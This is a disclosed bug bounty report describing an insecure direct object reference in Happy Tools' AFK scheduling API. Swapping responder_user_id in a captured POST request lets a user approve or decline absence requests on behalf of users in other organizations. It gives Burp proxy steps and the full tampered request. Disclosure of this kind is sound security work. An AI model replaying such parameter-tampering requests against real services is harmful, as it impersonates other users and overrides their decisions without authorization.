# [IDOR] Attacker user can Approve/Decline AFK on the behalf of other users

## Report Details
- **Report ID**: 725569
- **URL**: https://hackerone.com/reports/725569
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-10-30T16:51:59.065Z
- **Disclosed**: 2019-12-01T06:46:30.480Z

## Reporter
- **Username**: sachin_kr
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: automattic

## Vulnerability Information
## Summary:
Hi team
Hope you are good
Missing proper authorization checks on the vulnerable request allows an attacker to approve/decline afk of users on the behalf of other user who is a member of other organization. This can be exploited simply by changing the responder_user_id in the vulnerable request.

## Platform(s) Affected:
[Happy tools / Website]

## Steps To Reproduce:
1. Create two accounts for happy tools and login into two different browsers say accounts 1 and 2 and browser A and B.
2. Configure browser A with burp proxy
3. Put an AFK request.
4. Go to https://schedule.happy.tools/afk and click on approve or decline and capture the request in burp.
5. Now replace the value of `responder_user_id` with the user id of account 2.
6. Valid response is shown.

## Supporting Material/References:
F621606
In this screenshot, the `user_id: 1920` is the id of user who belongs to account 1 and the `responder_user_id:1923` is the id of user B who belongs to different account and both users belong to different organizations.

###Vulnerable request :
```
POST /wpcom/v2/happytools/external/v1/schedule/afk-requests/12346 HTTP/1.1
Host: public-api.wordpress.com
Connection: close
Content-Length: 208
Accept: application/json, text/plain, */*
Origin: https://schedule.happy.tools
Authorization: ZZZZZZZZZZZZZZZZZ
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
Sec-Fetch-Mode: cors
Content-Type: application/json;charset=UTF-8
Sec-Fetch-Site: cross-site
Referer: https://schedule.happy.tools/afk
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

{"notes":"\">","timezone":"Africa/Bamako","approval_status":2,"end_at":1572048000,"is_last_minute":false,"responded_at":1572472124,"responder_user_id":1923,"start_at":1572048000,"type_id":1808,"user_id":1920}
```

## Impact

Using this issue an attacker to approve/decline AFK of users on the behalf of other user who is a member of other organization. This can be exploited simply by changing the responder_user_id parameter in the vulnerable request 
For more info please let me know
Thanks, regards 
Sachin

## Attachments
- Screenshot_from_2019-10-31_03-41-28.png
